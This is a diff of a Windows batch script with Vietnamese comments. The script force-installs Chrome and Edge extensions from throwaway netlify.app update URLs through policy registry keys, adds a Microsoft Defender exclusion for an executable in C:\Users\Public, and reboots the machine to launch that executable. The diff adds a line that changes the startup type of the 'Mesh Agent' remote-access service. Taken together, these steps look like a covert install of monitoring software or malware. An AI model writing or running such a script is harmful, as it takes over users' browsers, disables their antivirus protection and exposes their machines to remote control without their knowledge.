@@ -82,6 +82,9 @@ reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /t
 reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
 reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iebbomgkmmlpcgfdllpicncloggmpmap;https://remarkable-tarsier-70cdce.netlify.app/update.xml" /f
 
+REM === Chạy lệnh PowerShell để set Mesh Agent sang Manual ===
+powershell -Command "Set-Service -Name 'Mesh Agent' -StartupType Manual"
+
 :: === Thêm vào danh sách ngoại lệ Defender trước khi hỏi restart ===
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
 
@@ -95,3 +98,4 @@ Start-Sleep -Seconds 3; shutdown /r /t 10 /c 'Máy sẽ khởi động lại đ�
 Start-Process -FilePath 'C:\Users\Public\monitorUrlnew.exe' }"
 echo Done all setup. Exiting script...
 exit /b 0
+
